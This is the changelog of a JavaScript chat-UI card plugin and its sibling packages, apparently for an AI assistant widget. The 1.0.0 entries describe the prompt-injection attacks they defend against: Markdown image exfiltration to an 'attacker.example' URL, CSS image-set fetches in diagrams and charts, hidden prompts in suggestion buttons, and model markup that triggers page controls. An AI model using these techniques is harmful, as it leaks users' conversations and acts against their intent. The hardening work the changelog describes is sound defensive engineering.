# @aparte/plugin-cards

## 1.0.0

### Major Changes

- 67efebe: A picture a model or a tool chose no longer loads by itself: `data:` and `blob:` pictures do, and any other shows as a link naming its host until the reader clicks it. To load your own, call `aparteGlobalConfig.setImagePolicy(['self', 'https://cdn.example.com'])`; `['*']` loads every picture, as before.

  - **Why.** A picture fetches its address the moment it is shown, before anyone reads the reply, and a prompt-injected model can write the conversation into that address: `![](https://attacker.example/c.png?d=…)` sent it, the reader's IP and their browser to that host with no click — while the reply streamed, and again each time the conversation was shown. The page's own site is not trusted by default either: its pictures carry the reader's cookies (`![](/api/logout)`), and an open redirect on it turns a picture from the site into a picture from anywhere.
  - **In a reply.** A held picture is a small link that says where it would load from (inside a link of the reply's own, a button, so that link stays whole). A click loads it in place, and the chat remembers the choice; a click with a modifier key is left to the browser, as for any link. `config.sanitizeHtml` applies the policy after whichever sanitizer is set, so DOMPurify or your own keeps it, and `@aparte/plugin-streaming-markdown` applies it before any `src` is set, so nothing is fetched while a reply streams. A picture's own address decides; of its `srcset`, only the candidates that load are kept, written again so a browser can only pick an address that was judged.
  - **In a card.** `@aparte/plugin-cards` draws a card without the pictures the policy held, and one "Show images" button with every host they would load from beside it; pressing it draws them. A card of your own asks through `ctx.image(src, props)` and `ctx.loads(url)`.
  - **The rule.** `setImagePolicy` takes a list (`'self'`, `'*'`, origins) or a function `(url) => 'load' | 'hold' | 'drop'`. `config.decideImage(url)` answers for a plugin that draws pictures itself, and `config.showImage(url)` records the reader's choice. Every picture that loads goes with `referrerpolicy="no-referrer"`. A CSP `img-src` is the stronger rule beside it: it also checks where a redirect leads.
  - Two locale keys, `imageLoad` and `imageLoadNamed`, name a held picture; `@aparte/locales` carries them in its nine languages.
  - **The console says why.** Until the app names a policy, the first picture held on a page writes one note in the console, with its host and the line to add; `setImagePolicy([])` keeps the default and silences it.

### Patch Changes

- bf0b979: A Mermaid diagram with a node picture from a URL (`A@{ img: "https://…" }`) is no longer drawn: it shows its source, since drawing it sent a request to that address from the page. An inline `data:image/…` picture still draws.

  - `@aparte/plugin-mermaid` — Mermaid loads a node's `img:` and a sequence actor's icon in the page while it draws, before the plugin turns the SVG into an image, and `securityLevel: 'strict'` does not cover it. The plugin now asks Mermaid what it parsed (`mermaid.mermaidAPI.getDiagramFromText`, which draws nothing) and shows the source of a diagram holding a picture that is not `data:image/…`, however the source spelled it (a YAML anchor and alias, an escape, `properties`, or `details` reading an element of the page). So a sequence diagram that only says "properties" in a message, or a label that says "img", is drawn. A `mermaid` object without `mermaidAPI` (your own, passed to `setupMermaidWith`) falls back to refusing on the text, which refuses those too. A style a diagram writes is read as well: a CSS `url(`, `image-set(`, `cross-fade(` or `@import` anywhere in the source, or a backslash escape in a source that styles something (`classDef c mask-image:url(https://…)` in a state or block diagram was fetched while the diagram was measured), shows the source. The diagrams page and the README no longer say that nothing in a diagram reaches the page without this.
  - `@aparte/plugin-echarts` — a colour string such as `rgb(` followed by thousands of spaces froze the tab for seconds: the colour check backtracked cubically (4 KB took 15 s). It is now linear, and a colour longer than 64 characters is dropped. A font value under any key with "font" in it (`textFont`, a toolbox icon's `textFontFamily`…) that holds more than a font name is dropped, `textFill` / `textStroke` must be colours, and `image-set(…)` / `cross-fade(…)` in any string is refused: `;mask-image:image-set("https://…")` made the browser fetch the picture as soon as the chart drew. A `cursor` (and a dataZoom's `cursorGrab` / `cursorGrabbing`) that is not a keyword is dropped too: `image-set("https://…")` made the browser fetch the picture when the pointer passed over the chart. `pointer`, `not-allowed` and the other keywords are kept. A symbol written `emptyImage://…` is dropped like `image://…` (ECharts strips `empty` and then draws the picture), in a series, a legend icon, a dataZoom handle, a mark point or a decal. A chart fence that is only open brackets no longer takes seconds to read while it streams: reading what has arrived is linear (40,000 brackets took 5 s, on every frame).
  - `@aparte/plugin-chartjs` — a string in a dataset's own `tooltip.callbacks` or in `options.interaction` (and `external`, `filter`, `itemSort`, an unknown `position`) is dropped like the chart's top-level tooltip ones; it threw on every hover. A tooltip's own `interaction` and `plugins` keys are dropped too (`plugins.tooltip.interaction.external`, `plugins.tooltip.plugins.tooltip.callbacks`): Chart.js resolves a tooltip option through them as well, and neither is an option of the tooltip. A config fence that is only open brackets is read in linear time while it streams (40,000 brackets took 5 s, on every frame).
  - `@aparte/plugin-cards` — the plan card read a step line in quadratic time when it held a long run of spaces (1 s for 50 000 characters); it is linear now, also for a line holding a lone carriage return, which used to throw. The titles it draws are unchanged.

- 635f69b: A reply button the model wrote in a `suggestions` block now sends the text on its button: a `prompt` in a `{ "label", "prompt" }` reply is ignored. A card's `actions` now receives who wrote the card as `actions(data, { origin })`.

  - `@aparte/core` — a block such as `{"label": "No, cancel", "prompt": "Yes, I confirm the transfer"}` showed "No, cancel" and sent the hidden prompt as the person's message. The block is model text, so `<aparte-suggestions answers>` now sends the label of each reply and never its `prompt` (even a prompt that begins with the label can go on to say the opposite), and drops a reply whose label is not what the person reads: blank; longer than 100 characters; or holding a character that draws nothing or reorders the words (bidi controls, zero-width and tag characters, variation selectors, a joiner or variation selector between letters of a script that is not written with them, five non-spacing marks in a row). Runs of spaces collapse to one, the chip wraps a long label instead of running past the chat, and what is sent is exactly the text on the chip. Emoji sequences with joiners (including 🏳️‍🌈, ❤️‍🔥 and 👁️‍🗨️, written with a variation selector before the joiner), keycaps, the England, Scotland and Wales flags, Persian half-spaces, Indic, Sinhala and Burmese words and accents are kept. A joiner is kept only inside an emoji sequence or between letters of a script written with joiners, so none can hide text between the letters of an English label. A reply that is dropped is named once in the console. A click on a reply does nothing while a question holds the composer (it used to answer the question with the option the model had preselected) or while a reply is streaming (it used to stop it), and it sends its own text without taking what the person was typing or the files they had attached. A click the composer refuses (disabled, no model chosen yet) leaves the field as it was, and a second chip does not send while the first one is on its way. If your backend relied on a hidden prompt in a block, write the replies in the `suggestions` attribute or property of the element instead: a page's own `suggestions` keeps its free label/prompt split.
  - `@aparte/plugin-cards` — `actions` takes a second argument, `{ origin }`, and the `aparte-card-action` event carries `detail.origin`: `'tool'` for the result of a tool your app runs, `'segment'` for a `card` segment your app added, and `'fence'` for a card the model wrote as a `card-<name>` code block in its answer. A card of the model's own (`'fence'`) draws only the links among its actions: an action carrying an `id` is not drawn, since your `aparte-card-action` listener would run it with a label and data the model chose; the buttons you give it through `actions` are drawn. A `send` built from the fields of a `'fence'` card is a message the model chose for the person, so keep it fixed there, or give the button an `id` and decide in the listener. The guide's example no longer builds `send` from the card's location. New types: `CardOrigin`, `CardActionsContext`.

- 2e5c5ab: npm descriptions, keywords and READMEs now say what the packages do: your backend, tool calls, interactive cards. No code change; the Svelte deprecation notes no longer promise a move to `@aparte/svelte/legacy`.

  - `@aparte/core` — a new description and six more keywords (`generative-ui`, `tool-ui`, `agent-ui`, `chat-widget`, `openai-compatible`, `assistant`). Its README opens with the picture of a reply and lists the launcher, citations, maths, diagrams, charts and suggestions. It also ships a short `llms.txt` that points to the full text on apartejs.dev.
  - `@aparte/react`, `@aparte/vue`, `@aparte/svelte`, `@aparte/angular` — the description now starts with the category ("React AI chat component…") instead of "wrapper for aparté".
  - `@aparte/plugin-cards` — the description names all eleven kinds of card; lists (`items`) was missing.
  - `@aparte/engine` — the README keeps what the package does for a user and drops the history of how the loop moved.

  The monorepo README gets the same opening and the picture, lists `@aparte/plugin-storage-idb`, the six templates and the agent runners, and links the guides on apartejs.dev.

- e97d464: Markdown a model writes can no longer carry the attributes core reads as controls, and `<input>` in a reply is limited to a disabled checkbox. Your code needs a change only if a custom segment renderer, a tool `details` string or a custom sanitizer's output relied on those attributes (below), or if a reply was meant to carry a text field or a `role` such as `textbox`.

  What now does nothing, and where it can touch your code:

  - A control carrying `data-aparte-dialog-open`, `data-aparte-dialog-close`, `data-aparte-sidebar-toggle`, `data-aparte-split-pane` or `data-aparte-launcher-close` is ignored when it sits inside a message's content: a custom segment renderer, a tool renderer, a reply. Controls your page places (a header button, a dialog's own Close) work as before. The `@aparte/core` component pages for the dialog, sidebar, split and launcher say so.
  - A tool display's `details` string goes through the sanitizer, so `data-action`, `data-segment-id`, the reserved attributes below and a widget `role` are stripped from it.
  - A card outside any chat on a page with two or more composers no longer sends: it warns instead of picking one. With exactly one composer, or inside a chat, it sends as before.
  - `@aparte/core` — the built-in sanitizer drops these attributes from provider output: every `data-aparte-dialog-*`, `data-aparte-sidebar-*` and `data-checkpoint-*`, plus `data-aparte-chat`, `-host`, `-theme`, `-suggestions`, `-split-pane`, `-launcher-close`, `-bubble`, `-empty`, `-panel`, `-panel-host`, `-card-part`, `data-segment-id` and `data-action`. Other `data-*` attributes (`data-line`, `data-aparte-open` for a formula still streaming, `data-aparte-highlighted`) are kept. A sanitizer you register yourself replaces this list, which is why the listeners above check where the click started as well.

  Before, a reply could carry `<span data-aparte-dialog-open="delete-account">` and open your `<dialog>` on a click, toggle any sidebar by id, switch a split's pane, close the launcher or a dialog the chat sits in, press a compaction checkpoint's Restore without its confirm step, or wrap a card in `<div data-aparte-chat>` to restyle it or redirect its button to another chat. A test reads core's source (hyphenated names and `dataset` reads) so a new attribute cannot be forgotten.

  - `@aparte/core` — a widget `role` (`textbox`, `button`, `link`, `checkbox`, `switch`, `tab`, `tablist`, `menu`, `menuitem`, `dialog`, `combobox`, `listbox`, `grid`, `slider`, `toolbar`, `progressbar`, `tabpanel`…) is dropped from model markup, alone or in a list; every other role stays (`region`, `group`, `status`, `alert`, `math`, `meter`, `term`, `doc-*`, `note`, `figure`, `list`, `table`, `heading`…), since those describe structure and do nothing. `<a role="textbox">` used to take the launcher's focus on open, ahead of the composer; the launcher now ignores text in a reply when it looks for the composer.
  - `@aparte/core` — `<input>` is dropped unless it is `type="checkbox"` (a GFM task list); a kept checkbox is rewritten to `type="checkbox"` and `disabled`, so a padded `type="checkbox "` cannot render as a text box. `<input type="password" title="API key">` used to leave an editable box in the reply. Without a DOM parser (Node, SSR, a Worker) the sanitizer reads each tag the way a browser's tokenizer does and applies the same attribute rule as in a browser, so a server render drops the same attributes (the reserved `data-*`, widget roles, `aparte-` classes, layout styles, ids) and keeps the same task-list checkbox, rebuilt as `<input type="checkbox" disabled>` (checked or not, with its `class`), where a browser would; an attribute value is judged after its numeric entities are decoded and written back escaped. Comments and other `<!` / `<?` declarations are dropped, as in a browser, and a tag left open at the end of the text is dropped.
  - `@aparte/core` — a button inside a checkpoint's summary panel no longer restores. `resolveConfig` skips a `[data-aparte-host]` element that no `attachConfig` bound, so content inside one keeps the chat's own config instead of the page's. The sidebar and split no longer stamp `aria-expanded` / `aria-pressed` on such text.
  - `@aparte/plugin-cards` — a card's `send` button looks for its composer from above the bubble, so a `<div data-aparte-chat>` in the reply cannot redirect it to another chat.
  - `@aparte/plugin-katex`, `@aparte/plugin-artifacts` — the formula pacing key is the segment row (`.aparte-segments > [data-segment-id]`), and the binary-file card honours `data-action="download"` only on its own button, not in a converter's `previewHtml`.
  - `@aparte/core` — without a DOM parser (Node, SSR, a Worker) the sanitizer is a single linear pass: a stray `<` comes out as `&lt;`, so text left beside a dropped tag can no longer spell a new one (`<<x>script>`); a quote inside an attribute value is written as `&#39;`; a comment ends where a browser ends it; and a dangerous element (`script`, `svg`, `form`, `iframe`…) takes everything up to its end tag, or the rest of the text when it is never closed, as it does in a browser. Long hostile input no longer costs quadratic time.
  - `@aparte/core` — a `srcset` made of a very long run of letters (100 000 characters) no longer stalls the page for seconds, in a browser or without a DOM; the scheme check now starts only at the beginning of a candidate, so its cost grows in proportion to the length.

- Updated dependencies [26ddd6c]
- Updated dependencies [e97d464]
- Updated dependencies [0a6dd91]
- Updated dependencies [635f69b]
- Updated dependencies [224afde]
- Updated dependencies [2e5c5ab]
- Updated dependencies [67efebe]
- Updated dependencies [99fcc42]
- Updated dependencies [e97d464]
- Updated dependencies [048864d]
- Updated dependencies [99784ad]
  - @aparte/core@1.0.0

## 0.32.1

## 0.32.0

### Patch Changes

- 956c2b2: The README shows a picture of every card, each linked to its page on apartejs.dev.

  An image search for aparté's cards found other sites' widgets: the cards were live demos in frames, and the package page had no picture.

## 0.31.0

## 0.30.1

## 0.30.0

### Minor Changes

- fca59cc: The place card can show a real map: pass `mapTiles` (your tile server's address, `{z}/{x}/{y}` in it) and `mapAttribution` to `setupPlaceCard`. Nothing changes without them.

  ```ts
  setupPlaceCard({
    mapTiles: "https://tile.openstreetmap.org/{z}/{x}/{y}.png",
    mapAttribution: "© OpenStreetMap contributors",
  });
  ```

  A place with coordinates and no photo then sits on nine tiles, centred under its marker, with the
  credit in a corner; `mapZoom` sets how close (16 by default). A photo still wins over the map, a
  place without coordinates keeps the drawn map, and so does a card whose tile fails to load.
  Off by default because each tile is a request to a third party that sees the visitor and the
  place: the provider (OpenStreetMap, MapTiler, Stadia, your own) is the app's choice. Tiles keep
  the page's referrer, which OpenStreetMap's usage policy asks for. `--aparte-place-map-filter`
  takes a CSS filter to dim them in a dark theme.

### Patch Changes

- e6a3198: `--aparte-product-image-fit: cover` now fills the product card's photo frame; a photo that was not square used to leave bands above and below it.

  The frame centres what it holds (for the placeholder's glyph), so the photo's 100% height never
  resolved: measured 186×140 px in a 186×186 frame. Shop packshots, drawn with the default
  `contain`, look the same as before.

## 0.29.4

## 0.29.3

### Patch Changes

- 89e03ee: A card of your own (`defineCard`) is drawn from its ` ```card-<name> ` block even when it is set up after `setupCardFences()`, and a block can pick the card's layout with `"variant"` in its JSON.

  - plugin-cards: `setupCardFences()` hears of each card set up on its config from then on and draws its blocks too; before, only the cards known when it started were, and a card defined later showed its source.
  - plugin-cards: `"variant": "<name>"` in a block's JSON picks that layout when it is one of the card's; any other value is the card's data as before.
  - plugin-cards: a product alone in its answer is drawn with a landscape picture, and with a low band when it has none. The square frame, the width of a chat column, made the card taller than the chat's view, and empty when the product had no picture. In a row of products the tiles stay square.
  - core, plugin-cards: a message with padding and a card with its border no longer run past their column. Both took `max-width: 100%` and counted padding or border outside it, so a bubble clipped their right edge.
  - plugin-cards: a change a live card was still waiting on when the conversation was left and opened again lands on the card now shown. It was drawn on the element the person had left, and the card they came back to kept the old value until the next redraw.

## 0.29.2

### Patch Changes

- df050ad: A card written as a ` ```card-<name> ` block is drawn on its own, without the code card's header, language label and copy button around it.

  Core: a code-language renderer can say `bare: true` — its drawing then stands for the whole fenced block, and the code card around it goes. Diagrams, charts and maths keep their card and the copy of their source. `setupCardFences()` sets it.

  A link in the person's own bubble (an email or a URL they typed) now takes the bubble's text colour, underlined: it was drawn in the link colour, which on a bubble filled with the primary was the bubble's own colour.

## 0.29.1

### Patch Changes

- Add `setupCardFences()`: a ` ```card-weather ` code block of JSON in an answer is drawn as the weather card (every card has its `card-<name>` language).

  For backends that send only text and keep their tool calls to themselves — a workflow engine, a server that streams its answer, a model with no tools. `load` maps a card's name to its entry (`() => import('@aparte/plugin-cards/weather')`), fetched the first time a block names it. While the block streams a placeholder holds its place; a block whose JSON does not parse, or whose card the page cannot draw, shows its source. Works with any Markdown provider, or none.

## 0.29.0

### Minor Changes

- 324d2ba: New package: `@aparte/plugin-cards` draws a tool's result as a rich card instead of a row. Import one card's entry and call its setup, e.g. `setupWeatherCard({ tool: 'get_weather', map })`.

  Eleven cards, each its own entry so an app ships only the ones it imports: `weather`, `items` (articles and search results), `product`, `place`, `stats` (key figures), `order` (orders and bookings), `stock` (a quote with its line or candlestick chart), `plan` (an agent's task list, updated in place), `score` (matches), `media` (pictures, videos, sounds, with a lightbox) and `link` (a page preview). Each has three or four variants, chosen by name or by a function of the data, and a reader that already takes the shapes the usual APIs return (Open-Meteo, Shopify, Stripe, Google Places, Yahoo Finance, API-Football, Open Graph…); `map` turns your tool's own fields into the card's. While the call runs the card shows its skeleton; a call refused, stopped or failed is one line that says so, never a card. Every card is also a `card` segment (`weatherCard.segment(data)`) with a fallback sentence for a text-only reader, and its words come in the ten languages of `@aparte/locales`, rewritten in place on a language switch.

  A card can answer back: with an `onChange`, the stock card draws range buttons over its chart, and what `onChange` returns is drawn in place — the same element, the focus kept. Changes run one at a time, each from the data the one before left, and what they returned is kept while the page lives: a turn ending, the conversation saved or reopened, in every framework, draws the card as the person left it. A button the app declares (`actions`) can open a link, send a message or only report; a button read from a tool's result can only be a web link or an `id`, never text sent as the person. Setting a card up twice stacks: the newer setup draws, and removing the older one leaves it in place. The root entry is the kit the cards are made with (`defineCard`, `segmented`, `toggle`, `slider`, `carousel`, `sparkline`, the `Intl` formatters), for a card of your own that behaves the same way.
